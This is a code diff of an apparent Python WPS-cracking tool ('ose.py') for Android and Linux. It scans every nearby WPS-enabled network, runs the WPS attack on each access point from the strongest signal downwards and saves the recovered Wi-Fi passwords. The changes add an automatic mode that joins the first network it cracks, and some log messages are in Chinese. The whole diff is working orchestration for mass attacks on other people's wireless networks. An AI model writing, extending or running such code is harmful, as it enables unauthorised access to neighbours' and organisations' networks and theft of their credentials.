-def handleConnection(interface: str, vuln_list: list):
-    """The whole workflow, start to finish.
-
-    1. scan for every nearby WPS network and keep the list in ``candidate_list``
-    2. walk it from the strongest signal (highest dBm) downwards
-    3. run the WPS attack on each BSSID, one at a time, saving every recovered
-       credential to the password file.
-
-    No Wi-Fi connection is made here — recovering and saving credentials is the
-    whole job. Connecting to a specific network is the separate ``-c`` mode.
-    """
+def handleConnection(interface: str, connect_only: bool = False):
 
     connection = WPSConnection(interface)
 
-    scanner = WiFiScanner(interface, vuln_list)
+    scanner = WiFiScanner(interface)
     candidate_list = scanner.scanTargets()
 
     if not candidate_list:
         error('No WPS-enabled network found — nothing to test')
-        return
+        if connect_only:
+            return _connectFallback(interface)
+        return None
 
     info(f'{len(candidate_list)} WPS network(s) discovered — '
          f'starting at the strongest signal')
@@ -1980,25 +1731,83 @@ def handleConnection(interface: str, vuln_list: list):
 
         cracked += 1
 
-        if PIXIE_DUST:
-            addVulnerableAP(scan_info)
-
         success(f'PSK for {bssid} recovered and saved')
 
-        # Restart the supplicant so the next AP starts from a clean state,
-        # not one still associated to the AP we just cracked.
+        if connect_only:
+            
+            
+            
+            
+            essid = (connection.CONNECTION_STATUS.ESSID or '').strip()
+            psk = (connection.CONNECTION_STATUS.WPA_PSK or '').strip()
+
+            if essid and psk and essid != '<hidden>':
+                
+                
+                
+                
+                connection._resetSupplicant()
+
+                info(f'[c] 已破解 {essid}，立即连接…')
+                if connectToNetwork(interface, essid, psk, bssid=bssid):
+                    success(f'Connected to \'{essid}\'')
+                else:
+                    error(f'Recovered \'{essid}\' but could not connect')
+                return essid
+
+            warning('PSK recovered but the ESSID is unusable — '
+                    'trying the configured fallback')
+            break
+
+        
+        
         connection._resetSupplicant()
+
+    if connect_only:
+        
+        
+        warning('No usable PSK recovered from any reachable AP')
+        return _connectFallback(interface)
 
     if cracked == 0:
         warning('No PSK recovered from any reachable AP')
     else:
         success(f'Recovered credentials for {cracked} network(s)')
 
+    return None
+
+def _connectFallback(interface: str):
+
+    essid = (CONNECT_SSID or '').strip()
+    psk = (CONNECT_PSK or '').strip()
+
+    if not essid or not psk:
+        warning('Nothing to connect to: the scan found no crackable network, '
+                'and CONNECT_SSID / CONNECT_PSK are not filled in.\n'
+                '    Fill them in at the top of ose.py to give -c a network to '
+                'join when the scan comes up empty.')
+        return None
+
+    info(f'[c] 使用 CONNECT_SSID / CONNECT_PSK 连接 \'{essid}\'…')
+
+    if connectToNetwork(interface, essid, psk):
+        success(f'Connected to \'{essid}\'')
+        return essid
+
+    error(f'Failed to connect to \'{essid}\'')
+    return None
 
 def main():
-    """Main os-e code"""
 
     connect_only = '-c' in sys.argv[1:]
+    mode2 = '-m' in sys.argv[1:]
+
+    
+    
+    
+    
+    global MODE2
+    MODE2 = mode2
 
     checkRequirements()
     setupDirectories()
@@ -2011,48 +1820,85 @@ def main():
 
     info(f'Using interface \'{interface}\'')
 
+    if MODE2:
+        info('[*] 方案2：WiFi 开关保持开启，仅断开当前连接')
+        info('[*] 断开动作由 App 在框架层完成（四级兜底，见 WifiDisconnector）')
+        info('[*] 脚本只校验网卡是否已空闲，不再自行抢夺')
+
+    if MODE2:
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        for attempt in range(5):
+            if _interfaceIsFree(interface):
+                break
+
+            if attempt == 0:
+                info(f'[*] {interface} 仍在关联中，等待框架断开…')
+
+            time.sleep(1.0)
+        else:
+            code, link = _run(['iw', 'dev', interface, 'link'])
+            die('方案2 需要先断开当前 WiFi 连接，'
+                '但 {0} 仍关联在某个 AP 上。\n'
+                '    内核报告：{1}\n'
+                '    请在系统设置里断开当前 WiFi（不必关闭 WiFi 开关），然后重试。'
+                .format(interface, (link or '（无输出）').replace('\n', ' / ')))
+
+        info(f'[*] {interface} 已空闲，开始扫描')
+
     android_network = AndroidNetwork()
 
-    # Set to True only once we have actually taken Wi-Fi down, so the finally
-    # block knows whether restoring it is our job at all.
+    
+    
+    
     wifi_taken_down = False
 
+    
+    
+    explicit_essid = None
+    explicit_psk = None
+
     try:
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
         if connect_only:
-            # -c <SSID> <password>: connect using the parameters passed on the
-            # command line. Nothing is read from or written to wifipassword.txt
-            # — unlike a plain run, which only recovers and saves credentials.
             idx = sys.argv.index('-c')
             args_after = sys.argv[idx + 1:]
 
-            if len(args_after) < 2:
-                die('Usage: ose.py -c <SSID> <password>')
+            if len(args_after) == 1:
+                
+                
+                
+                die('Usage: ose.py -c [<SSID> <password>]')
 
-            essid, psk = args_after[0], args_after[1]
-            info(f'Connecting to \'{essid}\' (SSID/password passed on the command line)')
-
-            # The radio is bounced before connecting: taking it down clears any
-            # half-established association left over from the attack run, and
-            # bringing it straight back up hands the framework an interface in
-            # a known-good state for the connect below.
-            if androidWifiManaged():
-                setupAndroidWifi(android_network)
-                setupAndroidWifi(android_network, enable=True)
-
-            if ifaceCtl(interface, action='up'):
-                die(f'Unable to up interface \'{interface}\'')
-
-            if connectToNetwork(interface, essid, psk):
-                success(f'Connected to {essid}')
-            else:
-                error(f'Failed to connect to {essid}')
-
-            return
+            if len(args_after) >= 2:
+                explicit_essid = args_after[0]
+                explicit_psk = args_after[1]
 
         if not VERBOSE and not isAndroid():
             clearScreen()
 
-        if androidWifiManaged():
+        
+        
+        
+        if androidWifiManaged() and not MODE2:
             setupAndroidWifi(android_network)
             wifi_taken_down = True
 
@@ -2064,9 +1910,19 @@ def main():
         if ifaceCtl(interface, action='up'):
             die(f'Unable to up interface \'{interface}\'')
 
-        # The run only recovers and saves credentials; it never connects.
-        # Wi-Fi is restored at the end by the finally block below.
-        handleConnection(interface, loadVulnList())
+        if connect_only and explicit_essid is not None:
+            
+            
+            info(f'[c] 使用命令行给出的凭据连接 \'{explicit_essid}\'…')
+            if connectToNetwork(interface, explicit_essid, explicit_psk):
+                success(f'Connected to \'{explicit_essid}\'')
+            else:
+                error(f'Failed to connect to \'{explicit_essid}\'')
+        else:
+            
+            
+            
+            handleConnection(interface, connect_only=connect_only)
 
     except KeyboardInterrupt:
         info('Aborting…')
@@ -2074,10 +1930,10 @@ def main():
     finally:
         _releaseInterface(interface)
 
-        # Only hand Wi-Fi back to the framework if this run is the one that took
-        # it down. Restoring it unconditionally — including on the -c path, where
-        # Wi-Fi was never touched — re-enabled the radio at the very end of every
-        # run, which is one of the ways Wi-Fi appeared to "come back by itself".
+        
+        
+        
+        
         if wifi_taken_down and androidWifiManaged():
             setupAndroidWifi(android_network, enable=True)
 
@@ -2087,17 +1943,21 @@ def main():
         if MTK_WIFI and wmt_wifi_device is not None:
             wmt_wifi_device.write_text('0', encoding='utf-8')
 
-        # Show what has been collected so far, straight from the file
+        
         info('Stored credentials:')
         CredentialStore.echo()
 
-def _findSupplicantPids(interface: str) -> list:
-    """Find every wpa_supplicant process bound to ``interface``.
+def _interfaceIsFree(interface: str) -> bool:
 
-    A supplicant started with ``-iwlan0`` keeps the interface busy, and the
-    netlink scan cannot be relied on to spot it, so look at the command line
-    directly instead.
-    """
+    code, link = _run(['iw', 'dev', interface, 'link'])
+
+    if code != 0 or not link:
+        return True
+
+    return not any(line.strip().startswith('Connected to')
+                   for line in link.splitlines())
+
+def _findSupplicantPids(interface: str) -> list:
 
     pids = []
 
@@ -2122,12 +1982,6 @@ def _findSupplicantPids(interface: str) -> list:
     return pids
 
 def _releaseInterface(interface: str):
-    """Give the wireless interface back to the system.
-
-    Terminates any ``wpa_supplicant`` instance we started on ``interface`` and
-    removes the stale control socket left behind, so the OS Wi-Fi client is able
-    to drive the interface again once the script exits.
-    """
 
     if which('wpa_cli'):
         _run(['wpa_cli', '-i', interface, 'terminate'])
